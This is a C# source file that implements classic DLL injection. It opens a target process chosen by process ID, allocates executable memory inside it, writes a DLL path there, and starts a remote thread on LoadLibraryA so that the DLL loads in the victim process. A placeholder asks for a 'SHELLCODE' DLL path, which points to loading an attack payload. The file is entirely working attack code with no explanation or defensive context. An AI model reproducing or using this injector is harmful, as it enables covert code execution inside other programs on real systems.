using System;
using System.Runtime.InteropServices;
using System.Text;
using static DLLInjection.Imports;

namespace DLLInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            string dllpath = @"SHELLCODE DLL PATH PLEASE";

            byte[] buff = Encoding.Default.GetBytes(dllpath);

            var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;
            int bytesWritten = 0;
            int lpthreadIP = 0;
            int buffSize = buff.Length;

            IntPtr procHandle = OpenProcess((UInt32)desiredAccess, false, Convert.ToUInt32(args[0]));

            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffSize, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(procHandle, init, buff, (uint)buffSize, ref bytesWritten);
            IntPtr handle = GetModuleHandleW("kernel32.dll");
            IntPtr funcAddr = GetProcAddress(handle, "LoadLibraryA");
            IntPtr threadHandle = CreateRemoteThread(procHandle, IntPtr.Zero, 0, funcAddr, init, 0, ref lpthreadIP);
        }
    }

    class Imports
    {
        #region imports
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref int lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandleW(string lpModuleName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        #endregion

        #region const
        public enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        public enum Protection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }
        public enum Process
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }
        #endregion
    }
}
